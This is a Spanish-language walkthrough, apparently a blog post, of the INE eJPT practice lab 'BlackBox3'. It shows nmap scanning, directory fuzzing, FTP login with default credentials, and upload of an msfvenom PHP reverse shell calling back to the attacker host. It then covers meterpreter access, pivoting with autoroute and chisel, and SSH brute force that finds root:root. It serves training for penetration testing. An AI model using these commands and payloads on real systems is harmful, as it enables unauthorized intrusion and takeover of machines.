---
layout: post
title: BlackBox3 INE-ejpt
tags: [pivoting, metasploit]
description: "BlackBox3 INE-ejpt"
---

- [Enumerando objetivos](#enumerando-objetivos)
  * [Nmap](#nmap)
  * [creando un script](#creando-un-script)
- [Escaneo de servicios](#escaneo-de-servicios)
- [172.16.37.220](#1721637220)
  * [Web](#web)
- [172.16.37.234](#1721637234)
  * [WEB](#web)
  * [FTP (40121)](#ftp--40121-)
  * [msfvenom](#msfvenom)
  * [shell meterpreter](#shell-meterpreter)
  * [Pseudo terminal](#pseudo-terminal)
- [Pivoting](#pivoting)
  * [Remote PortForwarding](#remote-portforwarding)
- [Fuerza bruta por SSH](#fuerza-bruta-por-ssh)
  * [Metasploit ssh_login](#metasploit-ssh-login)
  * [Fuerza bruta con Hydra](#fuerza-bruta-con-hydra)

IP asignado: 10.13.37.10

## Enumerando objetivos

### Nmap
> -sn : omitir la fase d eescaneo de puertos

```
❯ nmap -sn 172.16.37.0/24

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:10 -05
Nmap scan report for 172.16.37.1
Host is up (0.072s latency).
Nmap scan report for 172.16.37.220
Host is up (0.073s latency).
Nmap scan report for 172.16.37.234
Host is up (0.073s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.40 seconds
```

### creando un script

![ipScan](/assets/imgs/box3/ipScan.png)

```
❯ ./ipScan.sh
172.16.37.1
172.16.37.220
172.16.37.234
```

------

## Escaneo de servicios

```
for i in $(cat ips) ; do echo -e "\n[*] Scanning $i"; nmap --min-rate 5000 -n -Pn -vvv -p- --open $i; done

[*] Scanning 172.16.37.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:22 -05
Happy 24th Birthday to Nmap, may it live to be 124!
Initiating Connect Scan at 20:22
Scanning 172.16.37.1 [65535 ports]
Completed Connect Scan at 20:23, 14.99s elapsed (65535 total ports)
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.03 seconds

[*] Scanning 172.16.37.220
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:23 -05
Happy 24th Birthday to Nmap, may it live to be 124!
Initiating Connect Scan at 20:23
Scanning 172.16.37.220 [65535 ports]
Discovered open port 80/tcp on 172.16.37.220
Discovered open port 3307/tcp on 172.16.37.220
Completed Connect Scan at 20:23, 21.85s elapsed (65535 total ports)
Nmap scan report for 172.16.37.220
Host is up, received user-set (0.081s latency).
Scanned at 2021-09-01 20:23:13 -05 for 22s
Not shown: 33906 closed ports, 31627 filtered ports
Reason: 33906 conn-refused and 31627 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        REASON
80/tcp   open  http           syn-ack
3307/tcp open  opsession-prxy syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.90 seconds

[*] Scanning 172.16.37.234
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:23 -05
Happy 24th Birthday to Nmap, may it live to be 124!
Initiating Connect Scan at 20:23
Scanning 172.16.37.234 [65535 ports]
Discovered open port 40121/tcp on 172.16.37.234
Completed Connect Scan at 20:23, 21.58s elapsed (65535 total ports)
Nmap scan report for 172.16.37.234
Host is up, received user-set (0.073s latency).
Scanned at 2021-09-01 20:23:35 -05 for 21s
Not shown: 36036 filtered ports, 29498 closed ports
Reason: 36036 no-responses and 29498 conn-refused
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
40121/tcp open  unknown syn-ack
40180/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
```

----

## 172.16.37.220

### Web
Visualizando el codigo fuente

![fuente](/assets/imgs/box3/fuente.png)


## 172.16.37.234

```
❯ nmap -p40121,40180 -sV -n  172.16.37.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 20:36 -05
Nmap scan report for 172.16.37.234
Host is up (0.088s latency).

PORT      STATE SERVICE VERSION
40121/tcp open  ftp     ProFTPD 1.3.0a
40180/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Unix
```

### WEB
Fuzzing por el puerto 40180

```
❯ ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://172.16.37.234:40180/FUZZ" -c -t 200

[...]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376]
.hta                    [Status: 403, Size: 295, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 300, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 300, Words: 22, Lines: 12]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]
xyz                     [Status: 301, Size: 321, Words: 20, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 1798 req/sec :: Duration: [0:00:21] :: Errors: 0 ::


❯ ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://172.16.37.234:40180/xyz/FUZZ" -c -t 200

[...]
                        [Status: 200, Size: 1408, Words: 348, Lines: 28]
.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 304, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 299, Words: 22, Lines: 12]
index.php               [Status: 200, Size: 1408, Words: 348, Lines: 28]
```

![fuente2](/assets/imgs/box3/fuente2.png)


### FTP (40121)

ftpuser : ftpuser

```
❯ ftp 172.16.37.234 40121
Connected to 172.16.37.234.
220 ProFTPD 1.3.0a Server (ProFTPD Default Installation. Please use 'ftpuser' to log in.) [172.16.37.234]
Name (172.16.37.234:noroot): ftpuser
331 Password required for ftpuser.
Password:
230 User ftpuser logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 May 20  2019 html
```

Al hacer unas pruebas me doy cuenta de que el metodo `put` (para la carga de archivos) se encuentra habilitado.  
Otra observación es que la información que se transfiere por este servicio es la ruta `/var/www/html`. Se puede deducir que se esta compartiendo la carpeta donde se aloja el sitio web.

```
ftp> put test.php
local: test.php remote: test.php
200 PORT command successful
150 Opening BINARY mode data connection for test.php
226 Transfer complete.
```
![put](/assets/imgs/box3/put.png)


Por tanto creo un shellcode en lenguaje php para que sea interpretado por la web y de esta manera obtener una sesión en meterpreter.

### msfvenom

| argumento | descripción       |
|---------- | ----------------- |
| -p        | payload           |
| lhost     | ip local          |
| lport     | puerto en escucha |


```
msfvenom -p php/meterpreter_reverse_tcp lhost=10.13.37.10 lport=4444  > shell.php
```

### shell meterpreter

inicio metasploit para poner en escucha con el exploit `exploit/multi/handler`.

```
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.13.37.10:4444
[*] Meterpreter session 2 opened (10.13.37.10:4444 -> 172.16.37.234:55048) at 2021-09-01 20:54:19 -0500

meterpreter > getuid
Server username: www-data (33)
```

### Pseudo terminal

```
meterpreter > shell -t /bin/bash
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 2162 created.
Channel 2 created.

www-data@xubuntu:/var/www/html$ tty
tty
/dev/pts/3
```

----

## Pivoting

 Pivoting es la técnica en la que, a través de una máquina ya comprometida, se intenta escanear y atacar otras máquinas de otro segmento de red no accesible directamente por el atacante.  
 En Metasploit existe el módulo denominado `autoroute` con el que podremos crear fácilmente una ruta a través de una sesión de Meterpreter, consiguiendo así pivotar dentro de la red objetivo.

```
meterpreter > run autoroute -s 172.16.50.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.50.0/255.255.255.0...
[+] Added route to 172.16.50.0/255.255.255.0 via 172.16.37.234
[*] Use the -p option to list all active routes
```

Si escaneamos el nuevo rango de IP's. Encontraremos que `172.16.50.222` se encuentra activo.

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.50.1/24
set THREADS 50
run
```


### Remote PortForwarding

Otra forma sería realizar un redireccionamiento de puertos en caso conozcamos el puerto abierto.  
Chisel es la herramienta ideal ya que no necesitamos tener abierto el servicio `ssh` en el equipo victima.  

```
www-data@xubuntu:/tmp/test$ nmap -p- --open --min-rate 5000 -n 172.16.50.222

Starting Nmap 7.01 ( https://nmap.org ) at 2021-09-02 18:27 UTC
Nmap scan report for 172.16.50.222
Host is up (0.00039s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3307/tcp open  opsession-prxy
```

Chisel se ejcutaria de la siguiente manera:

Desde la máquina atacante

```
www-data@xubuntu:/tmp/test$ ./chisel client 10.13.37.10:8888 R:2222:172.16.50.222:22
2021/09/02 18:34:53 client: Connecting to ws://10.13.37.10:8888
2021/09/02 18:34:54 client: Connected (Latency 72.689838ms)
```

Desde la máquina victima

```
❯ chisel server -p 8888 --reverse
2021/09/02 13:34:52 server: Reverse tunnelling enabled
2021/09/02 13:34:52 server: Fingerprint OJ97k1wOGZ42i0TocGiyDmHqdj/PcviNbzhngxchJSM=
2021/09/02 13:34:52 server: Listening on http://0.0.0.0:8888
2021/09/02 13:34:56 server: session#1: Client version (1.7.6) differs from server version (0.0.0-src)
2021/09/02 13:34:56 server: session#1: tun: proxy#R:2222=>172.16.50.222:22: Listening
```


## Fuerza bruta por SSH

### Metasploit ssh_login

```
msf6 auxiliary(scanner/ssh/ssh_login) > run                                                    

[*] 172.16.50.222:22 - Starting bruteforce                                                                                                                                                [...]    
[-] 172.16.50.222:22 - Failed: '# minimal list of very common usernames :admin'                
[-] 172.16.50.222:22 - Failed: '# minimal list of very common usernames :support'                                                      
[-] 172.16.50.222:22 - Failed: '# minimal list of very common usernames :abuse'                                                        
[-] 172.16.50.222:22 - Failed: '# minimal list of very common usernames :postmaster'                                                   
[+] 172.16.50.222:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xubuntu 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 2 opened (10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22) at 2021-09-01 22:17:31 -0500                                                                        
```
### Fuerza bruta con Hydra

| argumento | descripción                                                |
| --------- | ---------------------------------------------------------- |
| -L        | diccionario de usuarios                                    |
| -P        | diccionario de contraseñas                                 |
| -V        | verbosidad                                                 |
| -f        | salir después del primer par de inicio de sesió encontrado |
| -s        | puerto                                                     |

```
❯ hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/ncrack/minimal.usr localhost ssh -V -f -s 2222
```

![hydra](/assets/imgs/box3/hydra.png)

![sshlogin](/assets/imgs/box3/sshlogin.png)
